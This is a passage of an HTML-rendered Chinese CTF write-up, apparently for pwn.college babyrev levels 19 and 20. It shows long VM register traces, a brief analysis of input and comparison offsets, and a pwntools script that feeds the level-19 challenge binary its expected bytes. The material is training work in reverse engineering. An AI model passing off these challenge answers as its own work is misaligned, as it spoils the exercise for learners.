class="hljs-number">8</span> i:<span class="hljs-number">37</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">4</span> c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">38</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">39</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">5</span> i:<span class="hljs-number">3</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">6</span> i:<span class="hljs-number">3</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">7</span> i:<span class="hljs-number">3</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x24030</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">20</span> d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2200b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">30</span> c:b d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">3</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:b d:<span class="hljs-number">5</span> s:<span class="hljs-number">8</span> i:<span class="hljs-number">40</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100404</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:b d:b s:<span class="hljs-number">8</span> i:<span class="hljs-number">41</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">30</span> c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">42</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">43</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">44</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x21044</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">45</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">46</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">47</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">8</span> i:<span class="hljs-number">48</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x802000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">7</span> i:<span class="hljs-number">49</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">6</span> i:<span class="hljs-number">4</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:<span class="hljs-number">4</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x210ce</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">59</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:cf f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20230</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">3</span>a c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:d0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2406e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">20</span> d:b s:<span class="hljs-number">5</span> i:d1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x22009</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:b s:<span class="hljs-number">5</span> i:d2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x20402</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:<span class="hljs-number">2</span> s:<span class="hljs-number">5</span> i:d3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10410</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">5</span> i:d4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:d5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x2109b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10220</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">6</span>e c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14020</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:d5 s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x204ff</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:<span class="hljs-number">9</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10204</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a0 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x14004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a1 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">7</span> i:a2 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x800040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a3 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x80202</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a4 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x84040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">65</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a5 f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x200240</span>						# cmp							<br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">65</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">8</span> i:a6 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x804000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">64</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">7</span> i:a7 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x800200</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:ff s:<span class="hljs-number">6</span> i:a8 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x204af</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:af s:<span class="hljs-number">6</span> i:a9 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x40804</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:af s:<span class="hljs-number">6</span> i:b0 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x800420</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">6</span> i:b1 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x801000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">9</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d6 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x22000</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d7 f:<span class="hljs-number">9</span><br><span class="hljs-attribute">0x200420</span>						# cmp<br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">9</span> s:<span class="hljs-number">5</span> i:d8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">5</span> i:d9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x40404</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>b s:<span class="hljs-number">5</span> i:da f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x204b1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:db f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x41104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b2 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x24001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b3 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x14008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b4 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20449</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">49</span> s:<span class="hljs-number">5</span> i:b5 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">49</span> s:<span class="hljs-number">6</span> i:b6 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>e s:<span class="hljs-number">6</span> i:b7 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>e s:<span class="hljs-number">7</span> i:b8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20443</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:<span class="hljs-number">7</span> i:b9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:<span class="hljs-number">8</span> i:ba f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>f s:<span class="hljs-number">8</span> i:bb f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>f s:<span class="hljs-number">9</span> i:bc f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20452</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:<span class="hljs-number">9</span> i:bd f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:a i:be f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20452</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:a i:bf f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:b i:c0 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20445</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">45</span> s:b i:c1 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">45</span> s:c i:c2 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20443</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:c i:c3 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:d i:c4 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20454</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">54</span> s:d i:c5 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">54</span> s:e i:c6 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20421</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">21</span> s:e i:c7 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">21</span> s:f i:c8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2040a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:a s:f i:c9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:a s:<span class="hljs-number">10</span> i:ca f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2200b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:b d:a s:<span class="hljs-number">10</span> i:cb f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:a s:<span class="hljs-number">10</span> i:cc f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x100104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:b s:<span class="hljs-number">10</span> i:cd f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:b s:<span class="hljs-number">10</span> i:ce f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x100200</span><br></code></pre></td></tr></table></figure>

<p>具体的opcode对应的操作指令，可以通过19.0对应出来。那么最后，分析发现用户输入偏移为0x30，目标字符串的偏移为0x6c。然后cmp指令比较时，从0x38偏移处开始比较的，然后目标字符串从0x76开始比较的。最后做相应处理即可。exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-19-1&#x27;,&#x27;b *$rebase(0x1d1c)&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-19-1&quot;</span>)<br>al = [<span class="hljs-number">0x42</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0xc2</span>, <span class="hljs-number">0x4d</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(len(al)):</span><br><span class="hljs-comment">#     if al[i] &gt;= 256:</span><br><span class="hljs-comment">#         payload += struct.pack(&#x27;B&#x27;, al[i] - 256)</span><br><span class="hljs-comment">#     else:</span><br><span class="hljs-comment">#         payload += struct.pack(&#x27;B&#x27;, al[i])</span><br>payload = struct.pack(<span class="hljs-string">&#x27;11B&#x27;</span>, *al)<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br><br></code></pre></td></tr></table></figure>



<h4 id="level20-0"><a href="#level20-0" class="headerlink" title="level20.0"></a>level20.0</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>x1e<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1e c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1e c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>xde<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>xde<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x20 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x21 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x22 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x2 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>KEY: <span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x23 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x24 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> STK NONE <span 